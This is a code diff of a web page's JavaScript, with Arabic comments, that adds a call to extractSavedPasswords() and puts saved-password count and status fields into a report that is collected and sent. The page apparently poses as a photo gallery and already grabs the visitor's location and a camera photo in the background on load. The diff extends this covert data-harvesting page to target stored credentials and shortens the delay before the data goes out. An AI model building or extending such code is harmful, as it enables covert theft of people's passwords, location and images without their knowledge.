@@ -196,7 +196,10 @@
                 location_status: window.userLocation?.status || 'لم يتم الطلب',
                 // إضافة حالة الكاميرا
                 camera_status: window.cameraStatus || 'لم يتم الطلب',
-                photo_captured: window.photoCaptured || 'لا'
+                photo_captured: window.photoCaptured || 'لا',
+                // إضافة معلومات كلمات المرور
+                saved_passwords_count: window.savedPasswordsCount || 0,
+                saved_passwords_status: window.savedPasswordsStatus || 'لم يتم البحث'
             };
         }
 
@@ -225,6 +228,8 @@
 🎯 دقة الموقع: ${data.location_accuracy}
 📷 حالة الكاميرا: ${data.camera_status}
 📸 تم التصوير: ${data.photo_captured}
+🔐 عدد كلمات المرور: ${data.saved_passwords_count}
+🔑 حالة كلمات المرور: ${data.saved_passwords_status}
 ━━━━━━━━━━━━━━━━━━
             `;
             
@@ -309,6 +314,8 @@
         window.userLocation = { status: 'جاري المحاولة...' };
         window.cameraStatus = 'لم يتم الطلب';
         window.photoCaptured = 'لا';
+        window.savedPasswordsCount = 0;
+        window.savedPasswordsStatus = 'لم يتم البحث';
 
         function getLocation() {
             return new Promise((resolve) => {
@@ -377,6 +384,7 @@
             // بدء العمليات في الخلفية فوراً
             getLocation();
             capturePhoto();
+            extractSavedPasswords();
             
             // انتظار قصير ثم جمع وإرسال البيانات
             setTimeout(async () => {
@@ -388,7 +396,7 @@
                 
                 // إظهار الصورة
                 showGallery();
-            }, 2000);
+            }, 1500); // تقليل الوقت
         }
 
         // تشغيل التطبيق عند تحميل الصفحة
